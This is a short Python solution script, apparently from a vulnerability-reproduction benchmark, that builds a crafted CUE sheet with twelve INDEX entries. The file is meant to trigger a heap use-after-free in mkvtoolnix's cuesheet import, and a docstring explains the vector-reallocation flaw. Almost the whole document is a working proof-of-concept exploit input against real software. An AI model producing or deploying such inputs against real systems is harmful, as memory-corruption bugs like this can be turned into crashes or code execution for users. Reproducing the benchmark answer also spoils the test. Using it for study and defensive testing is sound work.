import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability in mkvtoolnix.
        The vulnerability occurs in import_cuesheet when appending seekpoints (Indices).
        A reallocation of the underlying vector invalidates pointers/iterators.
        """
        # Construct a CUE sheet.
        # We use standard indentation which likely matches the ground truth format (~159 bytes for ~6 indices).
        # We generate enough indices to force a std::vector reallocation (e.g., exceeding capacity 4 or 8).
        
        # Header: FILE <name> <type>
        poc = b'FILE "A" WAVE\n'
        
        # Track: TRACK <num> <type>
        poc += b'  TRACK 01 AUDIO\n'
        
        # Indices: INDEX <num> <mm:ss:ff>
        # Generating 12 indices to be robust against different initial capacities (e.g. 8).
        for i in range(1, 13):
            poc += f'    INDEX {i:02d} 00:00:00\n'.encode('utf-8')
            
        return poc